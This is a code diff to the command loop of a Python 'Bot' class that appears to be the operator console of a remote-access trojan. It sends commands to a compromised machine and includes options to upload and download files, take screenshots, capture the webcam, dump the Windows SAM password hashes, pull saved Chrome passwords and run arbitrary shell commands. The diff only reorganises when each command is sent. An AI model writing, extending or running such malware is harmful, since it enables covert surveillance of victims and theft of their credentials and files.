@@ -208,33 +208,40 @@ class Bot:
         webcam_count = 0
         while True:
             command = input('* Shell~%s: ' % str(self.ip))
-            self.reliable_send(command)
             if command == 'quit':
+                self.reliable_send(command)
                 break
             elif command == 'background' or command == 'bg':
                 break
             elif command == 'clear':
                 os.system('clear')
             elif command[:3] == 'cd ':
-                pass
+                self.reliable_send(command)
             elif command[:6] == 'upload':
+                self.reliable_send(command)
                 self.upload_file(command[7:])
             elif command[:8] == 'download':
+                self.reliable_send(command)
                 self.download_file(command[9:])
             elif command[:10] == 'screenshot':
+                self.reliable_send(command)
                 self.screenshot(screenshot_count)
                 screenshot_count += 1
             elif command[:6] == 'webcam':
+                self.reliable_send(command)
                 self.webcam(webcam_count)
                 webcam_count += 1
             elif command[:12] == 'get_sam_dump':
+                self.reliable_send(command)
                 self.handle_sam_dump(command)
             elif command[:11] == "chrome_pass":
+                self.reliable_send(command)
                 result = self.reliable_recv()
                 print(result)
             elif command == 'help':
                 self.bot_help_manual()
             else:
+                self.reliable_send(command)
                 result = self.reliable_recv()
                 print(result)
 
